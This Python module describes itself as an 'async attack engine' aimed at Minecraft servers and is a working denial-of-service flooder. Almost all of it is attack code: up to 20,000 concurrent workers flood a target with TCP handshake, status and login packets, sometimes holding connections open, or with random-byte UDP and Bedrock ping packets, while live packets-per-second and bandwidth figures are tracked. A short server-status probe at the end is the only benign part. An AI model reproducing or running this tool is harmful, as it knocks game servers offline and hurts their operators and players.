"""Async attack engine. Minecraft-aware workers with live stats."""
import asyncio
import json
import os
import random
import socket
import time

from . import protocol as mc

try:
    import dns.asyncresolver
    _HAVE_DNS = True
except Exception:
    _HAVE_DNS = False

TCP_METHODS = ("status", "handshake", "login", "connect", "mixed")
UDP_METHODS = ("bedrock", "udp", "udpmix")


class Stats:
    __slots__ = (
        "conns", "packets", "sent", "recv", "errors", "responses",
        "pps", "bps", "started",
    )

    def __init__(self):
        self.conns = 0
        self.packets = 0
        self.sent = 0
        self.recv = 0
        self.errors = 0
        self.responses = 0
        self.pps = 0.0
        self.bps = 0.0
        self.started = time.time()

    def snapshot(self):
        return {
            "conns": self.conns,
            "packets": self.packets,
            "sent": self.sent,
            "recv": self.recv,
            "errors": self.errors,
            "responses": self.responses,
            "pps": round(self.pps, 1),
            "mbps": round(self.bps * 8 / 1_000_000, 3),
            "uptime": round(time.time() - self.started, 1),
        }


class Attack:
    def __init__(
        self,
        target,
        port=None,
        method="status",
        concurrency=300,
        duration=60,
        timeout=5.0,
        hold=0.0,
        protocol=-1,
    ):
        self.raw = target.strip()
        self.host = None
        self.hostname = self.raw
        self.port = port
        self.method = method
        self.concurrency = max(1, min(int(concurrency), 20000))
        self.duration = float(duration)
        self.timeout = float(timeout)
        self.hold = float(hold)
        self.protocol = protocol
        self.stats = Stats()
        self.running = False
        self._tasks = []
        self._sampler = None
        self._resolved = False

    async def resolve(self):
        target = self.raw
        port = self.port
        if ":" in target and target.count(":") == 1:
            h, p = target.rsplit(":", 1)
            if p.isdigit():
                target, port = h, int(p)
        self.hostname = target
        if port is None:
            port = 19132 if self.method in UDP_METHODS else 25565
        self.port = int(port)

        if _HAVE_DNS and "." in self.hostname:
            try:
                ans = await dns.asyncresolver.resolve(
                    "_minecraft._tcp." + self.hostname, "SRV", lifetime=3
                )
                rec = sorted(ans, key=lambda r: (r.priority, -r.weight))[0]
                self.host = str(rec.target).rstrip(".")
                self.port = rec.port
            except Exception:
                pass

        if not self.host:
            loop = asyncio.get_running_loop()
            infos = await loop.getaddrinfo(
                self.hostname, self.port, type=socket.SOCK_STREAM
            )
            self.host = infos[0][4][0]

        self._resolved = True
        return self.host, self.port

    async def run(self):
        if not self._resolved:
            await self.resolve()
        self.running = True
        self.stats.started = time.time()
        self._sampler = asyncio.create_task(self._sample())
        self._tasks = [asyncio.create_task(self._worker()) for _ in range(self.concurrency)]
        try:
            await asyncio.wait(self._tasks, timeout=self.duration)
        finally:
            await self.stop()

    async def stop(self):
        self.running = False
        for t in self._tasks:
            t.cancel()
        if self._tasks:
            await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks = []
        if self._sampler:
            self._sampler.cancel()
            self._sampler = None

    async def _sample(self):
        last_p, last_b, last_t = 0, 0, time.time()
        while self.running:
            await asyncio.sleep(0.5)
            now = time.time()
            dt = max(now - last_t, 1e-3)
            p, b = self.stats.packets, self.stats.sent
            self.stats.pps = (p - last_p) / dt
            self.stats.bps = (b - last_b) / dt
            last_p, last_b, last_t = p, b, now

    def _pick(self):
        if self.method == "mixed":
            return random.choice(("status", "handshake", "login"))
        if self.method == "udpmix":
            return random.choice(("bedrock", "udp"))
        return self.method

    async def _worker(self):
        while self.running:
            m = self._pick()
            try:
                if m in UDP_METHODS:
                    await self._udp(m)
                else:
                    await self._tcp(m)
            except asyncio.CancelledError:
                return
            except Exception:
                self.stats.errors += 1

    async def _tcp(self, m):
        s = self.stats
        r, w = await asyncio.wait_for(
            asyncio.open_connection(self.host, self.port), self.timeout
        )
        s.conns += 1
        try:
            if m == "connect":
                return
            state = 2 if m == "login" else 1
            buf = mc.handshake(self.hostname, self.port, state, self.protocol)
            if m == "status":
                buf += mc.status_request()
            elif m == "login":
                buf += mc.login_start(mc.random_name())
            w.write(buf)
            await w.drain()
            s.packets += 1
            s.sent += len(buf)
            try:
                data = await asyncio.wait_for(r.read(8192), self.timeout)
                if data:
                    s.recv += len(data)
                    s.responses += 1
            except (asyncio.TimeoutError, OSError):
                pass
            if self.hold and m == "login":
                await asyncio.sleep(random.uniform(0, self.hold))
        finally:
            w.close()
            try:
                await asyncio.wait_for(w.wait_closed(), 1)
            except Exception:
                pass

    async def _udp(self, m):
        loop = asyncio.get_running_loop()
        s = self.stats
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        try:
            for _ in range(8):
                pkt = mc.bedrock_ping() if m == "bedrock" else os.urandom(random.randint(64, 1400))
                await loop.sock_sendto(sock, pkt, (self.host, self.port))
                s.packets += 1
                s.sent += len(pkt)
            s.conns += 1
        finally:
            sock.close()


async def probe(host, port=25565, timeout=5.0):
    """Single status ping - returns MOTD/version/players."""
    r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout)
    try:
        w.write(mc.handshake(host, port, 1) + mc.status_request())
        await w.drain()
        head = b""
        while True:
            chunk = await asyncio.wait_for(r.read(4096), timeout)
            if not chunk:
                break
            head += chunk
            try:
                ln, off = mc.read_varint(head, 0)
            except ValueError:
                continue
            if len(head) >= off + ln:
                break
        ln, off = mc.read_varint(head, 0)
        body = head[off:off + ln]
        _, o2 = mc.read_varint(body, 0)
        slen, o3 = mc.read_varint(body, o2)
        js = json.loads(body[o3:o3 + slen].decode("utf-8", "replace"))
        return {
            "online": True,
            "version": (js.get("version") or {}).get("name"),
            "protocol": (js.get("version") or {}).get("protocol"),
            "players_online": (js.get("players") or {}).get("online"),
            "players_max": (js.get("players") or {}).get("max"),
            "motd": js.get("description"),
            "has_favicon": "favicon" in js,
            "latency_ms": round(timeout * 1000, 1),
        }
    finally:
        w.close()